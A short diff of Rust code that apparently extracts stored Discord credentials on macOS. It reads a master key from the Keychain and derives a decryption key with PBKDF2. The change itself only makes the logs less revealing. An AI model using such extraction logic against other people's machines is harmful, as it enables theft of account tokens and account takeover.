@@ -265,7 +265,10 @@ fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
         anyhow::bail!("Discord path does not exist: {:?}", discord_path);
     }
 
-    println!("Checking Discord path: {:?}", discord_path);
+    println!(
+        "Checking Discord path: {}",
+        crate::logger::sanitize_path(&discord_path.to_string_lossy())
+    );
 
     // Get the master key from macOS Keychain
     let master_key = get_master_key_from_keychain(client)?;
@@ -372,10 +375,7 @@ fn get_master_key_from_keychain(client: &DiscordClient) -> Result<Vec<u8>> {
 
     pbkdf2_hmac::<Sha1>(&raw_password, salt, iterations, &mut derived_key);
 
-    println!(
-        "Derived key using PBKDF2 (16 bytes): {:02x?}",
-        &derived_key[..8]
-    );
+    println!("Derived key using PBKDF2 (16 bytes)");
 
     // For AES-256-GCM we need 32 bytes, but Chromium on macOS uses AES-128-CBC
     // Let's try with the 16-byte key first by padding it
